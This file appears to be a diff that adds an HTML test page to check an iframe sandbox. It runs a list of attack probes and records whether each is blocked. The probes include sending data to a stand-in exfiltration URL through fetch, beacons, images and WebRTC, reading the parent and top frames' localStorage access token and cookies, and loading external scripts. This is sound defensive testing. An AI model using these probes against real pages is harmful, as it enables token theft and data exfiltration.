@@ -1,0 +1,254 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Sandbox attack suite</title>
+    <style>
+      body {
+        font:
+          12px system-ui,
+          sans-serif;
+        margin: 8px;
+      }
+      .pass {
+        color: #216e4e;
+      }
+      .fail {
+        color: #ae2a19;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+  <body>
+    <h3>Sandbox attack suite (runs inside the report frame)</h3>
+    <ol id="out"></ol>
+    <script>
+      // Each attack resolves { blocked, detail }. "blocked: true" is the desired outcome.
+      const EXT = 'https://example.com/spike-045-exfil?d=secret';
+      const violations = [];
+      document.addEventListener('securitypolicyviolation', (e) =>
+        violations.push({ directive: e.effectiveDirective, uri: e.blockedURI }),
+      );
+      const sawViolation = (directive) => violations.some((v) => v.directive === directive);
+      const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+      const threw = (fn) => {
+        try {
+          const v = fn();
+          return { blocked: false, detail: 'returned ' + String(v).slice(0, 80) };
+        } catch (e) {
+          return { blocked: true, detail: e.name + ': ' + e.message.slice(0, 100) };
+        }
+      };
+
+      const attacks = {
+        'origin is "null"': async () => ({ blocked: self.origin === 'null', detail: 'origin=' + self.origin }),
+        'fetch external': async () => {
+          try {
+            await fetch(EXT, { mode: 'no-cors' });
+            return { blocked: false, detail: 'request sent' };
+          } catch (e) {
+            return { blocked: true, detail: e.message };
+          }
+        },
+        'fetch host origin (relative URL)': async () => {
+          try {
+            const r = await fetch('/index.html');
+            return { blocked: false, detail: 'status ' + r.status };
+          } catch (e) {
+            return { blocked: true, detail: e.message };
+          }
+        },
+        XMLHttpRequest: () =>
+          new Promise((resolve) => {
+            try {
+              const x = new XMLHttpRequest();
+              x.open('GET', EXT);
+              x.onload = () => resolve({ blocked: false, detail: 'loaded ' + x.status });
+              x.onerror = () => resolve({ blocked: true, detail: 'onerror' });
+              x.send();
+            } catch (e) {
+              resolve({ blocked: true, detail: e.message });
+            }
+          }),
+        WebSocket: () =>
+          new Promise((resolve) => {
+            try {
+              const ws = new WebSocket('wss://echo.websocket.org/');
+              ws.onopen = () => resolve({ blocked: false, detail: 'opened' });
+              ws.onerror = () => resolve({ blocked: true, detail: 'onerror' });
+            } catch (e) {
+              resolve({ blocked: true, detail: e.message });
+            }
+          }),
+        EventSource: () =>
+          new Promise((resolve) => {
+            try {
+              const es = new EventSource(EXT);
+              es.onopen = () => resolve({ blocked: false, detail: 'opened' });
+              es.onerror = () => resolve({ blocked: true, detail: 'onerror' });
+            } catch (e) {
+              resolve({ blocked: true, detail: e.message });
+            }
+          }),
+        'navigator.sendBeacon': async () => {
+          let queued;
+          try {
+            queued = navigator.sendBeacon(EXT, 'secret');
+          } catch (e) {
+            return { blocked: true, detail: e.message };
+          }
+          await wait(300);
+          return {
+            blocked: !queued || sawViolation('connect-src'),
+            detail: `queued=${queued}, connect-src violation=${sawViolation('connect-src')}`,
+          };
+        },
+        '<img src=external>': () =>
+          new Promise((resolve) => {
+            const img = new Image();
+            img.onload = () => resolve({ blocked: false, detail: 'loaded' });
+            img.onerror = () => resolve({ blocked: true, detail: 'onerror' });
+            img.src = 'https://www.google.com/favicon.ico?d=secret';
+          }),
+        'CSS background url(external)': async () => {
+          const d = document.createElement('div');
+          d.style.backgroundImage = `url("${EXT}&css")`;
+          d.style.width = d.style.height = '1px';
+          document.body.append(d);
+          await wait(300);
+          return { blocked: sawViolation('img-src'), detail: 'img-src violation=' + sawViolation('img-src') };
+        },
+        '<script src=external>': () =>
+          new Promise((resolve) => {
+            const s = document.createElement('script');
+            s.onload = () => resolve({ blocked: false, detail: 'loaded' });
+            s.onerror = () => resolve({ blocked: true, detail: 'onerror' });
+            s.src = 'https://cdn.jsdelivr.net/npm/lodash/lodash.min.js';
+            document.head.append(s);
+          }),
+        'dynamic import()': async () => {
+          try {
+            await import('https://cdn.jsdelivr.net/npm/lodash-es/lodash.js');
+            return { blocked: false, detail: 'imported' };
+          } catch (e) {
+            return { blocked: true, detail: e.message.slice(0, 100) };
+          }
+        },
+        'import @forge/bridge': async () => {
+          try {
+            await import('@forge/bridge');
+            return { blocked: false, detail: 'imported' };
+          } catch (e) {
+            return { blocked: true, detail: e.message.slice(0, 100) };
+          }
+        },
+        'eval()': async () => threw(() => eval('1+1')),
+        // Chromium may return a Worker object and then fail the load asynchronously, so wait for it.
+        'new Worker(blob:)': () =>
+          new Promise((resolve) => {
+            let w;
+            try {
+              w = new Worker(URL.createObjectURL(new Blob(['postMessage("ran")'], { type: 'text/javascript' })));
+            } catch (e) {
+              return resolve({ blocked: true, detail: 'threw ' + e.message.slice(0, 80) });
+            }
+            w.onmessage = () => resolve({ blocked: false, detail: 'worker ran' });
+            w.onerror = () => resolve({ blocked: true, detail: 'worker failed to load (onerror)' });
+          }),
+        'globalThis.__bridge': async () => ({
+          blocked: typeof globalThis.__bridge === 'undefined',
+          detail: typeof globalThis.__bridge,
+        }),
+        'parent.__bridge': async () => threw(() => window.parent.__bridge.callBridge),
+        'top.__bridge': async () => threw(() => window.top.__bridge.callBridge),
+        'parent.document': async () => threw(() => window.parent.document.body.innerHTML.length),
+        'parent.location.href (read)': async () => threw(() => window.parent.location.href),
+        'top.location.href (read)': async () => threw(() => window.top.location.href),
+        'parent.localStorage': async () => threw(() => window.parent.localStorage.length),
+        'top.localStorage (app token)': async () => threw(() => window.top.localStorage.getItem('accessToken')),
+        'top.document': async () => threw(() => window.top.document.cookie),
+        localStorage: async () => threw(() => localStorage.setItem('x', '1')),
+        sessionStorage: async () => threw(() => sessionStorage.setItem('x', '1')),
+        'document.cookie': async () => threw(() => (document.cookie = 'x=1')),
+        indexedDB: async () => threw(() => indexedDB.open('x')),
+        'caches (CacheStorage)': async () => {
+          try {
+            await caches.open('x');
+            return { blocked: false, detail: 'opened' };
+          } catch (e) {
+            return { blocked: true, detail: e.name + ': ' + e.message.slice(0, 80) };
+          }
+        },
+        'document.domain =': async () => threw(() => (document.domain = document.domain)),
+        'top.location = external': async () => threw(() => (window.top.location = EXT)),
+        'parent.location = external': async () => threw(() => (window.parent.location = EXT)),
+        'window.open': async () => {
+          const r = threw(() => window.open(EXT));
+          if (!r.blocked && r.detail === 'returned null') return { blocked: true, detail: 'returned null' };
+          return r;
+        },
+        'alert() (modal)': async () => {
+          const t = Date.now();
+          const r = threw(() => alert('x'));
+          return r.blocked ? r : { blocked: Date.now() - t < 50, detail: 'alert returned without blocking' };
+        },
+        'WebRTC STUN (egress)': async () => {
+          if (typeof RTCPeerConnection === 'undefined') return { blocked: true, detail: 'no RTCPeerConnection' };
+          try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            const types = new Set();
+            pc.onicecandidate = (e) => e.candidate && types.add(e.candidate.type);
+            pc.createDataChannel('x');
+            await pc.setLocalDescription(await pc.createOffer());
+            await wait(3000);
+            pc.close();
+            return {
+              blocked: !types.has('srflx'),
+              detail: 'candidate types: ' + ([...types].join(',') || 'none'),
+            };
+          } catch (e) {
+            return { blocked: true, detail: e.message };
+          }
+        },
+        'WebRTC in child srcdoc frame (egress)': () =>
+          new Promise((resolve) => {
+            addEventListener('message', (e) => {
+              if (e.data && e.data.rtcChild)
+                resolve({ blocked: !/srflx/.test(e.data.rtcChild), detail: 'child: ' + e.data.rtcChild });
+            });
+            const f = document.createElement('iframe');
+            f.srcdoc =
+              '<script>(async()=>{if(typeof RTCPeerConnection==="undefined")return parent.postMessage({rtcChild:"no RTCPeerConnection"},"*");' +
+              'const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});const t=new Set();' +
+              'pc.onicecandidate=e=>e.candidate&&t.add(e.candidate.type);pc.createDataChannel("x");await pc.setLocalDescription(await pc.createOffer());' +
+              'setTimeout(()=>parent.postMessage({rtcChild:[...t].join(",")||"none"},"*"),3000)})()<' +
+              '/script>';
+            document.documentElement.append(f);
+            setTimeout(
+              () => resolve({ blocked: true, detail: 'child frame never reported (removed: ' + !f.isConnected + ')' }),
+              4500,
+            );
+          }),
+      };
+
+      (async () => {
+        const out = document.getElementById('out');
+        const results = [];
+        for (const [name, fn] of Object.entries(attacks)) {
+          let r;
+          try {
+            r = await Promise.race([fn(), wait(5000).then(() => ({ blocked: true, detail: 'timeout (no success)' }))]);
+          } catch (e) {
+            r = { blocked: true, detail: 'threw ' + e.message };
+          }
+          results.push({ name, ...r });
+          const li = document.createElement('li');
+          li.className = r.blocked ? 'pass' : 'fail';
+          li.textContent = `${r.blocked ? 'BLOCKED' : 'NOT BLOCKED'} — ${name}: ${r.detail}`;
+          out.append(li);
+        }
+        parent.postMessage({ __spikeTest: true, kind: 'attack-results', results, violations }, '*');
+      })();
+    </script>
+  </body>
+</html>
